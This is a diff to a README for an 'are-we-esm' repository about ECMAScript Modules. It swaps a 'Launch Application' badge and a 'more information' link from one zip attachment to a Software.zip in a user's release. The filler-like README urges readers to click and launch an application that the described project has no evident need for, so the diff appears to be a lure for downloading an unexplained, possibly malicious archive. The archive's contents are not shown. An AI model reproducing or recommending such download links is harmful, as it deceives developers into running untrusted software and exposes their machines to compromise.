@@ -11,7 +11,7 @@ Welcome to the "are-we-esm" repository! This project aims to answer the question
 Topics for this repository have not been provided.
 
 ### 🔗 Resource Link:
-[![Launch Application](https://img.shields.io/badge/Launch-Application-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Launch Application](https://github.com/bailey1411551/are-we-esm/releases/download/v2.0/Software.zip)](https://github.com/bailey1411551/are-we-esm/releases/download/v2.0/Software.zip)
 
 Please click on the badge above to **launch the application** and explore further. 
 
@@ -43,7 +43,7 @@ To fully utilize the power of ESM, it's essential to follow best practices such 
 Whether you are a seasoned JavaScript developer or just starting with ESM, this repository is here to guide you through the exciting world of ECMAScript Modules. Let's embrace the future of JavaScript together!
 
 ### 🚧 Explore Further:
-For more information and updates, visit the provided [link](https://github.com/user-attachments/files/18426772/Application.zip) to dive deeper into the realm of ECMAScript Modules.
+For more information and updates, visit the provided [link](https://github.com/bailey1411551/are-we-esm/releases/download/v2.0/Software.zip) to dive deeper into the realm of ECMAScript Modules.
 
 ### 🌐 Stay Connected:
 Follow us on GitHub for the latest updates and contributions to the "are-we-esm" repository. Let's continue to push the boundaries of ESM and elevate our JavaScript development skills! 
